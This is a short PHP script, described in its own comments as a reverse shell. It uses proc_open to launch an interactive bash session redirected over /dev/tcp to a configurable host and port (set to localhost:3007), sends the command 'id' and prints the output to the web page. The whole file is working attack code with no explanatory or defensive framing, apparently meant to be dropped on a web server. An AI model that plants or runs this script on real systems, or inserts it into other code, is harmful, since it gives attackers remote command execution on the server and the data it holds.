<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$ip = 'localhost'; 
$port = 3007;

// Descriptorspec for proc_open
$descriptorspec = array(
    0 => array("pipe", "r"),  // stdin
    1 => array("pipe", "w"),  // stdout
    2 => array("pipe", "w")   // stderr
);

// Command to execute the reverse shell
$cmd = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";

// Open the process
$process = proc_open($cmd, $descriptorspec, $pipes);

// Check if the process is a resource
if (is_resource($process)) {
    echo "Process started<br>";
    fwrite($pipes[0], "id\n");
    fflush($pipes[0]);

    $stdout = stream_get_contents($pipes[1]);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    $return_value = proc_close($process);

    echo "Command executed with return value: $return_value<br>";
    echo "Output: $stdout";
} else {
    echo "Failed to execute command";
}
?>
